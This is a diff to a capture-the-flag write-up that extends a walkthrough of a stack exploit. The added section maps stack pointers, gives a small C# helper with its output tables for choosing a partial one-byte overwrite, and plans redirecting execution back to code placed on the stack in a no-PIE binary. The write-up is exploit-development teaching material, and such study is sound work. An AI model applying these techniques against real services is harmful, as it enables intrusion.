@@ -186,6 +186,112 @@ Since we could not find gadgets in good proximity to the original return address
 Next, we looked into the stack, from the original return address and downwards (i.e. addresses increasing), to see if we can find *interesting* addresses pointing to the stack that we can use. On our gdb session, stack addresses begin with *7fffff...*:  
   
 ![Stack Dump](https://github.com/nimrods8/KITCTF-CTF-2022/blob/main/stack1.png)
+  
+If we take the original return address as address 00, we can write the following:
 
+```
++0x00     Return Address
++0x20     Points to Stack at 00 + 0x110 
++0x38     Points to Stack at 00 + 0x110 
++0xA8     Points to Stack at 00 + 0x120 
++0xD8     Points to Stack at 00 + 0x108 
++0xF8     Points to Stack at 00 + 0x100 
+```
   
+The general idea is to have the server executing down to our selected area at the stack, and then, by writing over as little as possible of the target address, point execution back to a higher (decreased) stack area and execute our code from there.
+But how do we know which one of these stack addresses is best for us?
+
+To help us decide, we've written this short C# code:  
+```
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace testBestKoeryOption
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            int retAddress = 0xe408;                // this is just a random address. We want the last byte to be 8 
+                                                    // because this is where the return address will always be located
+            int plusaddrs = 0x20;                   // this is the relative address of where a stack address is located on the stack
+            int plusStackPointer = 0x110;           // this is the addition to the base address written in the stack
+
+            Console.WriteLine("1st ret Address\t\t\tStack Base\t\tAddrs after writing zero");
+            Console.WriteLine("======================================================================================");
+
+            for ( int i = 0; i < 0x100; i += 0x10)
+            {
+                string addAst = "";
+                int newRet = retAddress + i;
+                Console.Write("{0:X}\t\t\t\t", newRet);
+                Console.Write("{0:X}\t\t\t\t\t", newRet + plusaddrs);
+
+                if(((newRet + plusStackPointer) & 0xff00) < newRet + plusaddrs)
+                {
+                    addAst = "*";
+                }
+
+                Console.WriteLine( "{0:X}\t\t{1}", (newRet + plusStackPointer) & 0xff00, addAst);
+            }
+            Console.ReadKey();
+        }
+        
+    }
+}
+```
   
+This code scans all relative stack addresses from xx08 to xxF8 and checks what would be the result if we write 00 at the lowest byte of that address.  
+This is the result of the first case, relative location +0x20 and stack address is +0x110:
+```
+1st ret Address                 Stack Base              Addrs after writing zero
+======================================================================================
+E408                            E428                                    E500
+E418                            E438                                    E500
+E428                            E448                                    E500
+E438                            E458                                    E500
+E448                            E468                                    E500
+E458                            E478                                    E500
+E468                            E488                                    E500
+E478                            E498                                    E500
+E488                            E4A8                                    E500
+E498                            E4B8                                    E500
+E4A8                            E4C8                                    E500
+E4B8                            E4D8                                    E500
+E4C8                            E4E8                                    E500
+E4D8                            E4F8                                    E500
+E4E8                            E508                                    E500            *
+E4F8                            E518                                    E600
+```  
+Note the small asterisk at the right hand side. This asterisk shows that only in one case out of 16 we can use this location and be able to jump back up the stack. We need to further check...  
+When we check the address located at 0xF8 (with value of +0x100), we got this result:
+```
+1st ret Address                 Stack Base              Addrs after writing zero
+======================================================================================
+E408                            E500                                    E500
+E418                            E510                                    E500            *
+E428                            E520                                    E500            *
+E438                            E530                                    E500            *
+E448                            E540                                    E500            *
+E458                            E550                                    E500            *
+E468                            E560                                    E500            *
+E478                            E570                                    E500            *
+E488                            E580                                    E500            *
+E498                            E590                                    E500            *
+E4A8                            E5A0                                    E500            *
+E4B8                            E5B0                                    E500            *
+E4C8                            E5C0                                    E500            *
+E4D8                            E5D0                                    E500            *
+E4E8                            E5E0                                    E500            *
+E4F8                            E5F0                                    E500            *
+```
+In this case we can clearly see that 15 our of 16 of the values, when writing 0x00 at the lowest byte of the stack address, we would get a stack address **above** our current address, hence we can use it to point execution to our code!
+  
+So, now we know where to go, we need to find a way to execute on stack down to Return Address + 0xF8 and, but how do we get there?
+  
+If you recall, the server's code is compiled with **no-pie**, that means that `main` addresses remain constant and absolute. That means we can point execution to any address we want within the ELF.  
+
+
